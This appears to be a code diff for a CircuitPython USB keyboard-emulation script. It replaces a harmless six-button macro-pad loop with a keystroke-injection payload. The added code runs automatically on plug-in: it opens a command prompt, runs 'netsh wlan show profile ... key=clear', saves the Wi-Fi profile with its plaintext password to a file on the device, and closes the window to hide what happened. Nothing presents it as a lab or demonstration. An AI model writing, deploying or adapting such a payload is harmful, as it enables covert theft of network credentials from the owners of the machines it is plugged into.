@@ -1,61 +1,30 @@
+# Tech Notebok
 import time
+import os
 import usb_hid
 from adafruit_hid.keycode import Keycode
 from adafruit_hid.keyboard import Keyboard
-import board
-import digitalio
+from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
 
+time.sleep(3)
 
-btn1_pin = board.GP9
-btn2_pin = board.GP8
-btn3_pin = board.GP7
-btn4_pin = board.GP19
-btn5_pin = board.GP20
-btn6_pin = board.GP21
+if not 'network.txt' in os.listdir():
+    time.sleep(1.5)
+    keyboard = Keyboard(usb_hid.devices)
+    layout = KeyboardLayoutUS(keyboard)
 
-btn1 = digitalio.DigitalInOut(btn1_pin)
-btn1.direction = digitalio.Direction.INPUT
-btn1.pull = digitalio.Pull.DOWN
+    keyboard.send(Keycode.WINDOWS, Keycode.R)
+    time.sleep(0.11)
 
-btn2 = digitalio.DigitalInOut(btn2_pin)
-btn2.direction = digitalio.Direction.INPUT
-btn2.pull = digitalio.Pull.DOWN
+    layout.write("cmd\n")
 
-btn3 = digitalio.DigitalInOut(btn3_pin)
-btn3.direction = digitalio.Direction.INPUT
-btn3.pull = digitalio.Pull.DOWN
+    time.sleep(0.17)
 
-btn4 = digitalio.DigitalInOut(btn4_pin)
-btn4.direction = digitalio.Direction.INPUT
-btn4.pull = digitalio.Pull.DOWN
+    layout.write("e:\n")
+    time.sleep(0.05)
 
-btn5 = digitalio.DigitalInOut(btn5_pin)
-btn5.direction = digitalio.Direction.INPUT
-btn5.pull = digitalio.Pull.DOWN
+    layout.write("netsh wlan show profile networkname key=clear > network.txt\n")
 
-btn6 = digitalio.DigitalInOut(btn6_pin)
-btn6.direction = digitalio.Direction.INPUT
-btn6.pull = digitalio.Pull.DOWN
+    time.sleep(0.6)
 
-keyboard = Keyboard(usb_hid.devices)
-
-while True:
-    if btn1.value:
-        keyboard.send(Keycode.CONTROL, Keycode.F7)
-        time.sleep(0.1)
-    if btn2.value:
-        keyboard.send(Keycode.CONTROL, Keycode.F8)
-        time.sleep(0.1)
-    if btn3.value:
-        keyboard.send(Keycode.CONTROL, Keycode.F9)
-        time.sleep(0.1)
-    if btn4.value:
-        keyboard.send(Keycode.CONTROL, Keycode.F10)
-        time.sleep(0.1)
-    if btn5.value:
-        keyboard.send(Keycode.CONTROL, Keycode.F11)
-        time.sleep(0.1)
-    if btn6.value:
-        keyboard.send(Keycode.CONTROL, Keycode.F12)
-        time.sleep(0.1)
-    time.sleep(0.1)
+    keyboard.send(Keycode.ALT, Keycode.F4)
